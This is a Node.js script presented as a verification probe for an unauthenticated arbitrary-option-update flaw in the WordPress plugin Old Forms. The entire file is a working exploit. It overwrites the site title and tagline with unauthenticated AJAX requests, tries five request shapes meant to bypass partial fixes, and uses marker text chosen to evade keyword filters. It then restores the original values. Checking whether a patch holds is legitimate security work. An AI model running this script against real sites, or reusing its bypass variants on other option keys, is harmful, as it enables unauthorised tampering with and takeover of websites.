#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90003 (Old Forms <= 1.4.2
// unauthenticated arbitrary options update via the of_save_field AJAX
// action, missing capability check / missing key restriction).
//
// Strategy: the vulnerable AJAX handler calls update_option($_POST['key'],
// $_POST['value']) with no capability check and no restriction on which
// option keys may be targeted. We use the unauthenticated-readable
// "blogdescription" and "blogname" options as a safe oracle: we set them
// to an unpredictable marker via the of_save_field action (several
// request-shape variants, to catch partial/naive fixes) and then read
// them back via the core REST API index (GET /, unauthenticated), which
// exposes site "name" and "description". If any variant's marker shows
// up, the arbitrary-option-update bug is still present. We restore the
// original values afterwards.
//
// Usage: node probe.mjs <base-url>
// Exit 0 => vulnerable, exit 1 => not vulnerable (fixed / inconclusive).

const base = process.argv[2];
if (!base) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(1);
}

const baseUrl = base.replace(/\/+$/, '');
const AJAX_URL = `${baseUrl}/wp-admin/admin-ajax.php`;

function uniqueMarker(tag) {
  // Looks like ordinary human-readable text, not a suspicious keyword,
  // so a naive substring/keyword filter wouldn't single it out.
  const r = Math.random().toString(36).slice(2, 10);
  const t = Date.now().toString(36);
  return `Welcome to our site ${tag}-${t}-${r}`;
}

// Fetch the REST index from several plausible locations (pretty
// permalinks may or may not be enabled) and return the first one that
// parses as the REST root (has "name"/"description" fields).
async function fetchRestIndex() {
  const candidates = [
    `${baseUrl}/wp-json/`,
    `${baseUrl}/?rest_route=/`,
    `${baseUrl}/index.php?rest_route=/`,
  ];
  for (const url of candidates) {
    try {
      const res = await fetch(url, { method: 'GET' });
      if (!res.ok) continue;
      const text = await res.text();
      let json;
      try {
        json = JSON.parse(text);
      } catch {
        continue;
      }
      if (json && (typeof json.name === 'string' || typeof json.description === 'string')) {
        return json;
      }
    } catch {
      // try next candidate
    }
  }
  return null;
}

// Attempt to set option `key` to `value` using several realistic
// variants of the attack request, in case a partial fix only blocks
// the most obvious shape (e.g. only checks application/x-www-form-urlencoded
// bodies, or only lowercases/trims the key in one particular way).
async function trySetOption(key, value) {
  const attempts = [];

  // Variant 1: plain form-urlencoded POST, the textbook request.
  attempts.push(async () => {
    const body = new URLSearchParams({ action: 'of_save_field', key, value });
    return fetch(AJAX_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  });

  // Variant 2: multipart/form-data POST (still populates $_POST in PHP,
  // but would slip past a filter that only inspects urlencoded bodies).
  attempts.push(async () => {
    const form = new FormData();
    form.set('action', 'of_save_field');
    form.set('key', key);
    form.set('value', value);
    return fetch(AJAX_URL, { method: 'POST', body: form });
  });

  // Variant 3: form-urlencoded POST with an extra harmless-looking nonce
  // field, in case a weak fix merely checks for the *presence* of a
  // nonce parameter without actually validating it.
  attempts.push(async () => {
    const body = new URLSearchParams({
      action: 'of_save_field',
      key,
      value,
      _wpnonce: 'ffffffffff',
      _ajax_nonce: 'ffffffffff',
    });
    return fetch(AJAX_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  });

  // Variant 4: mixed-case key (sanitize_key() lowercases, so this should
  // still land on the same option on an unpatched/half-patched site).
  attempts.push(async () => {
    const mixedKey = key
      .split('')
      .map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c))
      .join('');
    const body = new URLSearchParams({ action: 'of_save_field', key: mixedKey, value });
    return fetch(AJAX_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });
  });

  // Variant 5: key/value supplied via query string on a POST request
  // (some handlers that were "fixed" by validating $_REQUEST instead of
  // $_POST, or vice versa, can be inconsistent about which they trust).
  attempts.push(async () => {
    const qs = new URLSearchParams({ action: 'of_save_field', key, value }).toString();
    return fetch(`${AJAX_URL}?${qs}`, { method: 'POST' });
  });

  for (const attempt of attempts) {
    try {
      const res = await attempt();
      // Drain body to avoid dangling sockets; ignore content, the AJAX
      // action always returns a JSON envelope but we verify success via
      // the REST oracle, not via this response, to avoid trusting
      // anything the (possibly patched) server claims about itself.
      await res.text().catch(() => {});
    } catch {
      // network error on this variant; move on to the next
    }
  }
}

async function main() {
  const before = await fetchRestIndex();
  if (!before) {
    console.error('Could not read baseline REST index from target; inconclusive.');
    process.exit(1);
  }

  const origDescription = typeof before.description === 'string' ? before.description : '';
  const origName = typeof before.name === 'string' ? before.name : '';

  const markDescription = uniqueMarker('desc-probe');
  const markName = uniqueMarker('name-probe');

  let vulnerable = false;

  try {
    // Oracle #1: blogdescription (site tagline), exposed as "description".
    await trySetOption('blogdescription', markDescription);
    const afterDesc = await fetchRestIndex();
    if (afterDesc && afterDesc.description === markDescription) {
      vulnerable = true;
    }

    // Oracle #2: blogname (site title), exposed as "name". Tried even if
    // oracle #1 already proved the bug, both to have a second confirming
    // data point and in case a partial fix blocks blogdescription
    // specifically but not other arbitrary option keys.
    if (!vulnerable) {
      await trySetOption('blogname', markName);
      const afterName = await fetchRestIndex();
      if (afterName && afterName.name === markName) {
        vulnerable = true;
      }
    }
  } finally {
    // Best-effort restore of whatever we may have changed.
    try {
      await trySetOption('blogdescription', origDescription);
    } catch {
      /* ignore */
    }
    try {
      await trySetOption('blogname', origName);
    } catch {
      /* ignore */
    }
  }

  if (vulnerable) {
    console.log('VULNERABLE: unauthenticated of_save_field AJAX action updated an arbitrary WordPress option.');
    process.exit(0);
  } else {
    console.log('NOT VULNERABLE: no tested request variant was able to alter the target options.');
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('Probe error:', err && err.stack ? err.stack : err);
  process.exit(1);
});
